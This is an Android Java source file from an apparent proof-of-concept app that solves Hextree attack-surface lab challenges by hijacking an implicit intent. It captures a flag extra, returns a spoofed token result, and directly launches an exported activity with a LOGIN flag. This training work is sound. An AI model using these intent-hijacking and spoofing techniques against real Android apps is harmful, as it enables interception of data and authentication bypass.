package com.bedo.poc_app;

import android.content.ComponentName;
import android.content.Intent;
import android.os.Bundle;
import android.util.Log;
import android.view.View;
import android.widget.Toast;

import androidx.activity.EdgeToEdge;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.graphics.Insets;
import androidx.core.view.ViewCompat;
import androidx.core.view.WindowInsetsCompat;

public class Implicit_Intent_Labs extends AppCompatActivity {

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        EdgeToEdge.enable(this);
        setContentView(R.layout.activity_implicit_intent_labs);
        handleIncomingIntent();
    }

    private void handleIncomingIntent() {
        Intent intent = getIntent();
        String action = intent.getAction();

        if ("io.hextree.attacksurface.ATTACK_ME".equals(action)) {

            String flag10 = intent.getStringExtra("flag");
            if (flag10 != null) {
                Log.d("Hijack", "Flag Captured: " + flag10);
                Toast.makeText(this, "Got Flag: " + flag10, Toast.LENGTH_LONG).show();
            }

            // Handle Flag 11 & 12
            Intent result = new Intent();
            result.putExtra("token", 1094795585);
            setResult(RESULT_OK, result);

            Log.d("Hijack", "Result sent back to Hextree");
            finish();
        }
    }

    public void Flag12(View view) {
        ComponentName cn = new ComponentName("io.hextree.attacksurface", "io.hextree.attacksurface.activities.Flag12Activity");
        Intent intent = new Intent().setComponent(cn);

        intent.putExtra("LOGIN", true);
        startActivity(intent);
    }


}